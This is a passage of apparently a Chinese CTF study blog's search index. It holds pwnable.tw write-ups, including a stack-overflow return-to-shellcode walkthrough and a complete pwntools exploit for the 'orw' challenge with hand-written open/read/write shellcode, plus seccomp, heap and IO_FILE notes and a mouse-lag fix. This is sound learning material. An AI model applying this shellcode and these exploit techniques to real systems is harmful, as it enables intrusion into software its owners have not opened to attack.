</p>\n<p>​        尝试了一下一种新的下断点方式。    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png\" alt=\"截屏2021-11-04 下午7.43.49\"></p>\n<p>​        回到题目，很显然如果摁执行shellcode，就根本没有反应（（</p>\n<p>​        eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。</p>\n<p>​        新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。</p>\n<p>​        好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png\" alt=\"截屏2021-11-04 下午9.42.37\"></p>\n<p>​        这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后</p>\n<p>ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。</p>\n<p>​        (真有够麻烦的)</p>\n<h3 id=\"3）漏洞利用\"><a href=\"#3）漏洞利用\" class=\"headerlink\" title=\"3）漏洞利用\"></a>3）漏洞利用</h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png\" alt=\"截屏2021-11-04 下午9.50.04\">        </p>\n<p>​        看一下发现不对头，这个返回地址是我们的shellcode。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png\" alt=\"image-20211104215119020\"></p>\n<p>​        按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。</p>\n<p>​        然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。</p>\n<p>​        那么我们要retn到哪里呢？</p>\n<p>​        既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。</p>\n<p>​        既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用<code>sys_write</code></p>\n<p>对栈上内存进行一个读取。</p>\n<p>​        那么如何利用捏。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png\" alt=\"截屏2021-11-04 下午10.00.26\">            </p>\n<p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>\n<p>​        <code> mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>\n<p>​        </p>\n<p>![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png)        </p>\n<p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png\" alt=\"截屏2021-11-04 下午10.11.55\"></p>\n<p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>\n<p>​        这时候程序还是会按照原有的指令执行，比如说下一个<code>sys_read</code>函数。</p>\n<p>​        这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，<code>sys_read</code>会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20）</p>\n<p>​        然后直接溢出到栈地址。</p>\n<p>​        执行shellcode</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.23.43.png\" alt=\"截屏2021-11-04 下午10.23.18\"></p>\n<p>​            hhx</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png\" alt=\"截屏2021-11-04 下午10.24.07\"></p>\n<h3 id=\"4）总结\"><a href=\"#4）总结\" class=\"headerlink\" title=\"4）总结\"></a>4）总结</h3><p>​        这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。</p>\n<p>​        动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！</p>\n<p>​        另外容器要记得及时备份55.</p>\n<p>​        还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。</p>\n<p>​        </p>\n","categories":["MESS"],"tags":["pwnable"]},{"title":"Seccomp机制学习","url":"/2021/11/11/Seccomp%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-lWlXgzzI\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"1）Seccomp基础\"><a href=\"#1）Seccomp基础\" class=\"headerlink\" title=\"1）Seccomp基础\"></a>1）Seccomp基础</h2><h3 id=\"Seccomp简介\"><a href=\"#Seccomp简介\" class=\"headerlink\" title=\"Seccomp简介\"></a>Seccomp简介</h3><p>​        就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。</p>\n<h3 id=\"启动Seccomp\"><a href=\"#启动Seccomp\" class=\"headerlink\" title=\"启动Seccomp\"></a>启动Seccomp</h3><p>​        如果要编写调用Seccomp的程序，需要先安装相应的头文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：<a href=\"https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">seccomp学习笔记</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tscmp_filter_ctx ctx;</span><br><span class=\"line\"></span><br><span class=\"line\">\tctx = seccomp_init(SCMP_ACT_ALLOW);<span class=\"comment\">/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数）</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">seccomp_load(ctx);<span class=\"comment\">//调用，使过滤规则生效</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2）Seccomp-Tools\"><a href=\"#2）Seccomp-Tools\" class=\"headerlink\" title=\"2）Seccomp-Tools\"></a>2）Seccomp-Tools</h2><p>​        暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。</p>\n<h2 id=\"3）ORW例题\"><a href=\"#3）ORW例题\" class=\"headerlink\" title=\"3）ORW例题\"></a>3）ORW例题</h2><h3 id=\"pwnable-orw\"><a href=\"#pwnable-orw\" class=\"headerlink\" title=\"pwnable-orw\"></a>pwnable-orw</h3><p>​        pwnable第二题，orw。 </p>\n<p>​    </p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png\" alt=\"截屏2021-11-15 下午9.41.28\"></p>\n<p>​        这里的沙箱实际是通过prctl来控制实现的。</p>\n<blockquote>\n<p>(1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图)</p>\n<p>(2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程</p>\n<p>copy的宋师傅的博客捏</p>\n</blockquote>\n<p>​        所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。</p>\n<p>​        参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sys_open(<span class=\"string\">&quot;flag&quot;</span>)<span class=\"comment\">//读取flag</span></span><br><span class=\"line\">sys_read(<span class=\"string\">&quot;eax&quot;</span>,<span class=\"string\">&quot;esp&quot;</span>,<span class=\"number\">0x40</span>)<span class=\"comment\">//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下</span></span><br><span class=\"line\">sys_write(<span class=\"number\">1</span>,<span class=\"string\">&quot;esp&quot;</span>,<span class=\"number\">0x40</span>)<span class=\"comment\">//打印flag的值到屏幕输出</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。</p>\n<p>​        手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。</p>\n<p>​        并且进行软中断时使用的指令是<code>int 0x80</code>而不是<code>syscall</code>，<code>syscall</code>是c语言层面上的系统调用，而<code>int 0x80</code>才是汇编层面的系统调用。</p>\n<p>​        关于pwntools的asm模块，有一些比较怪的点。</p>\n<p>​        比如说我们可以这样写：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload =  asm(<span class=\"string\">&quot;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">也可以这样写</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">asm(<span class=\"string\">&#x27;mov eax, 0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        就是说，可以有分号，也可以没有。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./orw&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;chall.pwnable.tw&quot;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#open</span></span><br><span class=\"line\">payload =  asm(<span class=\"string\">&quot;push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#read</span></span><br><span class=\"line\">payload += asm(<span class=\"string\">&quot;mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#write</span></span><br><span class=\"line\">payload += asm(<span class=\"string\">&quot;mov eax, 0x4;mov ebx, 0x1;int 0x80;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png\" alt=\"截屏2021-11-17 下午10.28.54\">        </p>\n<h2 id=\"4）参考\"><a href=\"#4）参考\" class=\"headerlink\" title=\"4）参考\"></a>4）参考</h2><p>prctl函数开始学习沙箱规则](<a href=\"https://www.cnblogs.com/L0g4n-blog/p/12839171.html\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</a>)</p>\n","categories":["STACK - sandbox"],"tags":["pwnable"]},{"title":"妙控鼠标卡顿问题","url":"/2021/11/17/%E5%A6%99%E6%8E%A7%E9%BC%A0%E6%A0%87%E5%8D%A1%E9%A1%BF%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-IZqbIaDj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     </p>\n<p>​        最近刚花了三百大洋从室友那里买回了白嫖了半个学期的妙控鼠标，钱转了不到两天，鼠标开始疯狂卡顿。</p>\n<p>​        最初以为是外接了太多东西，把键盘啥的都换成了线控，但是问题还是不见解决。</p>\n<p>​        最后是这篇文章解决了我的问题。</p>\n<p>​        <a href=\"https://www.jianshu.com/p/3e7bc675f673\">macos系统里面，蓝牙鼠标偶尔卡顿，飘的问题</a></p>\n<p>​        解决方法也很简单，把网络中的蓝牙PAN的顺序调到最前。</p>\n<p>​        蓝牙PAN就是类似一种个人局域网，把连接顺序放到前面了，自然连接就更顺畅了（</p>\n","categories":["MESS"],"tags":["mess"]},{"title":"pwn题中的一些奇怪的姿势","url":"/2021/08/03/pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UgsHjUPL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"patch-alarm\"><a href=\"#patch-alarm\" class=\"headerlink\" title=\"patch alarm\"></a>patch alarm</h3><p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>\n<p>一般来说许多题都喜欢在main函数里加alarm。</p>\n<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>\n<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>\n<p>解决方案也比较弱智。就是直接patch掉就好了。</p>\n<p>ida都关了懒得上图了。</p>\n<h3 id=\"单双引号问题\"><a href=\"#单双引号问题\" class=\"headerlink\" title=\"单双引号问题\"></a>单双引号问题</h3><p>​        萌新赛出题的时候，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。</p>\n<p>​        然后索性调试一下，发现了奇点。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/EDFE9E0C6D3BC173B417FE06A8F28E18.png\" alt=\"EDFE9E0C6D3BC173B417FE06A8F28E18\"></p>\n<p>​        这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是<code>/bin/sh</code>，但是实际是<code>n/sh</code>，只有后面四个字节了。</p>\n<p>​        我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/DECB707DA78DA7002E7115E76713D24E.png\" alt=\"DECB707DA78DA7002E7115E76713D24E\"></p>\n<p>​        但是我的程序是这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/328953ED3A08C20DD6E4E20828BB5B56.png\" alt=\"328953ED3A08C20DD6E4E20828BB5B56\"></p>\n<p>​        然后发动传统艺能，控制变量找不同，发现问题出在<code>system(&#39;/bin/sh&#39;)</code>上。</p>\n<p>​        因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些<code>(&#39;./&#39;)</code> <code>(&quot;./&quot;)</code>，看起来区别不大，实际上也没有什么影响。</p>\n<p>​        但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>\n<p>​        然后把单引号改成双引号之后，就getshell了。</p>\n<h3 id=\"roputils\"><a href=\"#roputils\" class=\"headerlink\" title=\"roputils\"></a>roputils</h3><p>做ret2dl的时候难免会偷懒使用工具。</p>\n<p>但是这个工具并没有看起来那么和善。</p>\n<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>\n<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>\n<p>所以解决方式有2</p>\n<ol>\n<li> 将roputils转换为py3</li>\n<li> ubuntu切换py版本</li>\n</ol>\n<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>\n<p>具体参数可以google。</p>\n<p>然后又来了第三个问题。</p>\n<p>来看我的报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./babystack&#x27;</span>: pid <span class=\"number\">745</span></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;babystack.py&quot;</span>, line <span class=\"number\">23</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    rop = roputils.ROP(<span class=\"string\">&#x27;./babystack&#x27;</span>)</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class=\"number\">440</span>, <span class=\"keyword\">in</span> __init__</span><br><span class=\"line\">    ELF.__init__(self, *args, **kwargs)</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class=\"number\">85</span>, <span class=\"keyword\">in</span> __init__</span><br><span class=\"line\">    m = re.search(<span class=\"string\">r&#x27;^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$&#x27;</span>, line)</span><br><span class=\"line\">  File <span class=\"string\">&quot;/usr/lib/python3.6/re.py&quot;</span>, line <span class=\"number\">182</span>, <span class=\"keyword\">in</span> search</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _<span class=\"built_in\">compile</span>(pattern, flags).search(string)</span><br><span class=\"line\">TypeError: cannot use a string pattern on a <span class=\"built_in\">bytes</span>-like <span class=\"built_in\">object</span></span><br></pre></td></tr></table></figure>\n\n<p>这个功能好像并不会在byte前加b。。。</p>\n<p>目前来说并没有发现解决方法。</p>\n<p>所以只能尝试更换默认的py版本。具体可以google</p>\n<h3 id=\"main-arena与多线程\"><a href=\"#main-arena与多线程\" class=\"headerlink\" title=\"main_arena与多线程\"></a>main_arena与多线程</h3><p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>\n<blockquote>\n<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>\n</blockquote>\n<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>\n<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>\n<h4 id=\"加锁\"><a href=\"#加锁\" class=\"headerlink\" title=\"加锁\"></a>加锁</h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>\n<h4 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>\n<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>\n<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>\n<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>\n<blockquote>\n<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>\n</blockquote>\n<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>\n<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p><a href=\"https://zhuanlan.zhihu.com/p/24909781\">malloc x 线程</a></p>\n<p><a href=\"https://www.wangan.com/docs/1741\">GLibcHeap</a></p>\n","categories":["MESS"],"tags":["mess"]},{"title":"IO_FILE学习","url":"/2021/08/09/io_file%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-eJQLkMPz\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>io_file学习笔记</p>\n<h3 id=\"0）review\"><a href=\"#0）review\" class=\"headerlink\" title=\"0）review\"></a>0）review</h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>\n<p>结构源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    _IO_FILE    file;</span><br><span class=\"line\">    IO_jump_t   *vtable;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>\n<p>以fread为例子简述io_file结构调用的流程</p>\n<h4 id=\"fread\"><a href=\"#fread\" class=\"headerlink\" title=\"fread\"></a>fread</h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>\n<p>下面是<code>_IO_sgetn</code>的源码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_IO_size_t</span><br><span class=\"line\">_IO_sgetn (fp, data, n)</span><br><span class=\"line\">     _IO_FILE *fp;</span><br><span class=\"line\">     <span class=\"keyword\">void</span> *data;</span><br><span class=\"line\">     _IO_size_t n;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> _IO_XSGETN (fp, data, n);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>\n<p>也就是<code>_IO_XSGETN</code>。</p>\n<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>\n<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>\n<p><code>_IO_jump_t</code>源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"keyword\">size_t</span>, __dummy);</span><br><span class=\"line\">    JUMP_FIELD(<span class=\"keyword\">size_t</span>, __dummy2);</span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class=\"line\">    <span class=\"comment\">/* showmany */</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class=\"line\"><span class=\"meta\">#<span 